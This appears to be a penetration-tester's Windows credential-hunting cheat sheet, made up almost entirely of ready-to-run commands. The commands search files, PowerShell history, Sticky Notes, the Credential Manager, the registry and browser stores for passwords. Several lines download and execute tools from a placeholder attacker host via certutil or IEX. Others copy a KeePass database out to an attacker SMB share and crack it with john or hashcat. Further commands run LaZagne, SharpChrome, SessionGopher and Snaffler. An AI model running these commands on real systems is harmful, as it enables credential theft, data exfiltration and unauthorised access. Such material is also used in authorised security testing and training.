---
Primary_category: "[[CREDENTIAL HUNTING]]"
title: "WINDOWS CREDENTIAL HUNTING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[CREDENTIAL HUNTING]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS CREDENTIALS]]

#### *Application Configuration Files*

> ***e.g. IIS web.config file***

##### *Findstr*

> ***CMD & PS***

```bash
for %D in (C:\Users C:\Scripts C:\Temp C:\Windows\Temp) do @findstr /S /I /N /P /C:"password" /C:"passwd" /C:"pwd" /C:"secret" /C:"token" /C:"key" /C:"credential" "%D\*.txt" "%D\*.ini" "%D\*.cfg" "%D\*.config" "%D\*.xml" "%D\*.git" "%D\*.ps1" "%D\*.yml" 2>nul
```

> ***PS***

> ***Better choice*** 😊

```bash
Get-ChildItem -Path C:\Users,C:\Scripts,C:\Temp,C:\Windows\Temp -Recurse -File -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.git,*.ps1,*.yml -ErrorAction SilentlyContinue |
Select-String -Pattern 'password','passwd','pwd','secret','token','key','credential' -SimpleMatch |
Select-Object Path, LineNumber, Line
```

---

#### *Unattended Installation Files*

> ***e.g. auto{unattend.xml} file***

```bash
Get-ChildItem -Path 'C:' -Recurse -Filter '*.xml' -ErrorAction SilentlyContinue | ? { $_.FullName -match '.*unattend.xml.*' } | Select -ExpandProperty FullName
```

> [!BUG]- *unattend.xml*
>
> ```xml
> <?xml version="1.0" encoding="utf-8"?>
> <unattend xmlns="urn:schemas-microsoft-com:unattend">
>     <settings pass="specialize">
>         <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
>             <AutoLogon>
>                 <Password>
>                     <Value>local_4dmin_p@ss</Value>
>                     <PlainText>true</PlainText>
>                 </Password>
>                 <Enabled>true</Enabled>
>                 <LogonCount>2</LogonCount>
>                 <Username>Administrator</Username>
>             </AutoLogon>
>             <ComputerName>*</ComputerName>
>         </component>
>     </settings>
> ```
>

---

#### *Powershell History File*

Starting with *PS 5.0* in *Windows 10*, *PS* stores command history file to the following path

```bash
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

##### *Verifying Powershell History Save Path*

> ***PS***

```bash
(Get-PSReadLineOption).HistorySavePath
```

##### *Reading Powershell History File*

```bash
Get-Content (Get-PSReadLineOption).HistorySavePath
```

##### *Reading all existing Powershell History Files *

Once we compromise the entire system, we can issue the following command in order to look for sensitive information within all existing *PS* history files of any user

```bash
Get-ChildItem -Path 'C:\Users' -Directory | % { Get-Content C:\Users\$( $_.Name )\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue }
```

---

#### *Powershell Credential Objects*

> ***See [[PSCREDENTIAL OBJECT|PSCredential Objects]]***

---

#### *Windows Sticky Notes*

> ***Data stored in a SQLITE Database***

##### *Location*

```bash
C:\Users\<USER>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

##### *Information Extraction - Windows*

###### *Usage*

- ***Downloading the Powershell Module***

> ***From the attacker*** ⚔️

```bash
git clone https://github.com/RamblingCookieMonster/PSSQLite
```

```bash
zip -rv PSSQLite.zip PSSQLite
```

- ***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/PSSQLite.zip'
```

```bash
Expand-Archive -Path .\PSSQLite.zip -DestinationPath .
```

```bash
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PSSQLite\PSSQLite\PSSQLite.psd1
```

###### *Usage*

```bash
$db = '<SQLITE_FILE>'
```

```bash
Invoke-SqliteQuery -Database $db -Query 'Select Text FROM Note' | ft -wrap
```

##### *Information Extraction - UNIX-Like*

```bash
strings '<SQLITE_FILE>'
```

---

#### *Other Interesting Files*

> ***PS***

```bash
Get-ChildItem -Path 'C:\' -Recurse -Include '*.kdbx', '*.vmdk', '*.vhd', '*.vhdx', '*.ppk' -ErrorAction SilentlyContinue | Select -ExpandProperty FullName
```

> [!DANGER]- *Other Interesting Files*
>
> ```bash
> %SYSTEMDRIVE%\pagefile.sys
> %WINDIR%\debug\NetSetup.log
> %WINDIR%\repair\sam
> %WINDIR%\repair\system
> %WINDIR%\repair\software, %WINDIR%\repair\security
> %WINDIR%\iis6.log
> %WINDIR%\system32\config\AppEvent.Evt
> %WINDIR%\system32\config\SecEvent.Evt
> %WINDIR%\system32\config\default.sav
> %WINDIR%\system32\config\security.sav
> %WINDIR%\system32\config\software.sav
> %WINDIR%\system32\config\system.sav
> %WINDIR%\system32\CCM\logs\*.log
> %USERPROFILE%\ntuser.dat
> %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
> %WINDIR%\System32\drivers\etc\hosts
> C:\ProgramData\Configs\*
> C:\Program Files\Windows PowerShell\*
> ```
>

---

#### *Stored Credentials on Windows Credential Manager*

> ***Current User Context***

##### *Enumeration*

> ***Cmdkey***

```bash
cmdkey.exe /list
```

##### *Reusing Stored Credentials*

> ***Runas***

```bash
runas.exe /savecred /user:'<DOMAIN>\<USER>' <PROCESS>
```

> [!DANGER]- *e.g.*
>
> ```bash
> runas.exe /savecred /user:'DOMAIN.INTERNAL\john.doe' powershell.exe
> ```
>

---

#### *Browser Credentials*

##### *Retrieving Saved Credentials from Chrome*

> ***e.g. Cookies, Saved Logins and so on***

> ***[SharpChrome](https://github.com/GhostPack/SharpDPAPI/tree/master/SharpChrome)***

###### *Setup*

- ***Downloading the binary***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpChrome.exe'
```

- ***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
New-Item -Type Directory -Path "$env:\TEMP\LPE" -Force
cd "$env:\TEMP\LPE"
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SharpChrome.exe'
```

- ***Usage***

```bash
.\SharpChrome.exe logins /unprotect
```

##### *Retrieving Sensitive Information from Dictionary Files*

> ***e.g. Google Chrome Custom Dictionary***

> ***PS***

```bash
Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Custom Dictionary.txt" | Select-String -Pattern '(passwd|pass|key|token)'
```

---

#### *Password Managers*

##### *KeepassXC*

###### *Enumeration*

> ***From the target*** 🎯

> ***PS***

```bash
Get-ChildItem -Path 'C:\' -Recurse -Include '*.kdb', '*.kdbx' -ErrorAction SilentlyContinue | Select -ExpandProperty FullName
```

###### *Transferring the Keepass file to the attacker*

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user '<USER>' -password '<PASSWD>' '<SHARE>' '<LOCAL_PATH>'
```

> ***From the target*** 🎯

```bash
net use X: \\<ATTACKER_IP>\<SHARE> /USER:<USER> <PASSWD>
```

```bash
Copy-Item -Path <KEEPASS_FILE> -Destination X: -Force
```

###### *Extracting a crackable Hash from the Keepass Database File*

> ***[Keepass2john.py](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py)***

> ***From the attacker*** ⚔️

- ***Downloading the Python Script***

```bash
curl --silent --location --request GET --remote-name 'https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py'
```

- ***Installing Python2.7***

```bash
curl https://pyenv.run | bash
```

```bash
export PYENV_ROOT="$HOME/.pyenv"
export PATH="$PYENV_ROOT/bin:$PATH"
eval "$(pyenv init -)"
```

```bash
pyenv install 2.7.18
```

- ***Creating a Virtual Environment***

```bash
pyenv shell 2.7.18 && pip install virtualenv
virtualenv .venv
. !$/bin/activate
```

- ***Running the script***

```bash
python keepass2john.py '<KEEPASS_FILE>' > keepass.hash
```

###### *Trying to crack the given hash*

- ***John the Ripper***

> ***[JtR Jumbo](https://github.com/openwall/john)***

```bash
john --wordlist=<WORDLIST> keepass.hash
```

- ***Hashcat***

> ***[Hashcat](https://github.com/hashcat/hashcat)***

```bash
hashcat --force -O --attack-mode 0 --hash-type 13400 keepass.hash '<WORDLIST>'
```

---

#### *Microsoft Exchange Inbox*

> ***AD Environment***

> ***[MailSniper](https://github.com/dafthack/MailSniper)***

> ***From the attacker*** 🎯

##### *Setup*

###### *Downloading the Powershell Script*

```bash
IEX (New-Object Net.WebClient).downloadString('https://github.com/dafthack/MailSniper/raw/refs/heads/master/MailSniper.ps1')
```

##### *Usage*

> ***Invoke-GlobalMailSearch***

```bash
Invoke-GlobalMailSearch -ImpersonationAccount '<USER>' -ExchHostname '<EXCHANGE_SERVER>' -OutputCsv <OUTPUT_FILE>.csv
```

###### *Current User Mailbox*

> ***Invoke-SelfSearch***

```bash
Invoke-SelfSearch -Mailbox '<USER>@<DOMAIN>'
```

---

#### *Credentials on Windows Registry*

##### *Windows Autologon Credentials*

The *Windows Autologon Credentials* are stored within the following registry hive in plain text

```bash
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

In order to enable a system *autologon*, the registry hive above must have the following values

- **`AdminAutoLogon`** → ***Determines whether autologon is enabled or not***

> ***1 → Enabled <br> 0 → Disabled***

- **`DefaultUserName`** → ***User account that will automatically log on***

- **`DefaultPassword`** → ***Password for the user account specified previously***

> [!IMPORTANT]- *Important*
>
> ***If it's mandatory to set up Autologon, it's always recommended to use [Autologon.exe](https://learn.microsoft.com/es-es/sysinternals/downloads/autologon) from SysInternals, which encrypts and stores the given password as an [[SAM & SECURITY#Security (LSA Secrets)|LSA Secret]]***
>

##### *Listing Windows Autologon Credentials*

> ***CMD & PS***

```bash
reg query 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'
```

> ***PS***

```bash
Get-ItemProperty -Path 'HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon'
```

---

#### *Automated Enumeration and Extraction*

##### *Lazagne*

> ***[Lazagne](https://github.com/AlessandroZ/LaZagne)***

> ***[Standalone Binaries](https://github.com/AlessandroZ/LaZagne/releases)***

```bash
start lazagne.exe all
```

> ***Verbose Output***

```bash
start lazagne.exe -vv all
```

##### *SessionGopher*

> ***[SessionGopher](https://github.com/Arvanaghi/SessionGopher)***

###### *Setup*

- ***Downloading the Powershell Script***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/Arvanaghi/SessionGopher/raw/refs/heads/master/SessionGopher.ps1'
```

- ***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/SessionGopher.ps1)
```

###### *Usage*

> ***From the target*** 🎯

```bash
Invoke-SessionGopher -Target (hostname)
```

##### *Snaffler*

> ***[Snaffler](https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe)***

> ***It shines by enumerating AD Shares instead of local files***

###### *Setup*

- ***Downloading the binary***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe'
```

- ***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
New-Item -Type Directory -Path "$env:TEMP\LPE" -Force
cd "$env:\TEMP\LPE"
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/Snaffler.exe'
```

###### *Usage*

```bash
.\Snaffler.exe -s -d '<DOMAIN>' -o '<OUTPUT_FILE>.tsv' -v data -y
```